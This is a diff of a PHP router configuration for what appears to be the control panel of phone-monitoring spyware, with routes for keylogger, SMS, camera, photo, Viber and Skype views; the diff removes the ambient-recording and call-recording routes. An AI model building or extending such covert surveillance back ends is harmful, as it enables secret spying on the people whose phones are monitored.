@@ -28,8 +28,6 @@ $di->setShared('router', function() use($config) {
     $router->add('calendar', new \System\Router\Route('/cp/calendar', array('controller' => 'Calendar', 'action' => 'index')));
     $router->add('contacts', new \System\Router\Route('/cp/contacts', array('controller' => 'Contacts', 'action' => 'index')));
     $router->add('keylogger', new \System\Router\Route('/cp/keylogger', array('controller' => 'Keylogger', 'action' => 'index')));
-    $router->add('surrounding', new \System\Router\Route('/cp/surrounding', array('controller' => 'Surrounding', 'action' => 'index')));
-    $router->add('callRecordings', new \System\Router\Route('/cp/callRecordings', array('controller' => 'CallRecordings', 'action' => 'index')));
     $router->add('photos', new \System\Router\Route('/cp/photos', array('controller' => 'Photos', 'action' => 'index')));
     $router->add('videos', new \System\Router\Route('/cp/videos', array('controller' => 'Videos', 'action' => 'index')));
     $router->add('videosCamera', new \System\Router\Route('/cp/videos/camera', array('controller' => 'Videos', 'action' => 'camera')));
@@ -49,12 +47,6 @@ $di->setShared('router', function() use($config) {
     $router->add('locale', new \System\Router\Regex('/locale/:value', array('controller' => 'Index', 'action' => 'locale', 'public' => true), array('value' => '.+')));
     $router->add('setDevice', new \System\Router\Regex('/setDevice/:devId', array('controller' => 'CP', 'action' => 'setDevice'), array('devId' => '.+')));
     $router->add('smsList', new \System\Router\Regex('/cp/sms/:phoneNumber', array('controller' => 'Sms', 'action' => 'list'), array('phoneNumber' => '.+')));
-    $router->add('surroundingDelete', new \System\Router\Regex('/cp/surrounding/delete/:value', array('controller' => 'Surrounding', 'action' => 'delete'), array('value' => '.+')));
-    $router->add('surroundingPlay', new \System\Router\Regex('/cp/surrounding/play/:value', array('controller' => 'Surrounding', 'action' => 'play'), array('value' => '.+')));
-    $router->add('surroundingDownload', new \System\Router\Regex('/cp/surrounding/download/:value', array('controller' => 'Surrounding', 'action' => 'download'), array('value' => '.+')));
-    $router->add('callRecordingsDelete', new \System\Router\Regex('/cp/callRecordings/delete/:value', array('controller' => 'CallRecordings', 'action' => 'delete'), array('value' => '.+')));
-    $router->add('callRecordingsPlay', new \System\Router\Regex('/cp/callRecordings/play/:value', array('controller' => 'CallRecordings', 'action' => 'play'), array('value' => '.+')));
-    $router->add('callRecordingsDownload', new \System\Router\Regex('/cp/callRecordings/download/:value', array('controller' => 'CallRecordings', 'action' => 'download'), array('value' => '.+')));
     $router->add('photosAlbum', new \System\Router\Regex('/cp/photos/album/:album', array('controller' => 'Photos', 'action' => 'album'), array('album' => '.+')));
     $router->add('viberTab', new \System\Router\Regex('/cp/viber/:tab', array('controller' => 'Viber', 'action' => 'index'), array('tab' => 'private|group|calls')));
     $router->add('skypeTab', new \System\Router\Regex('/cp/skype/:tab', array('controller' => 'Skype', 'action' => 'index'), array('tab' => 'messages|calls')));
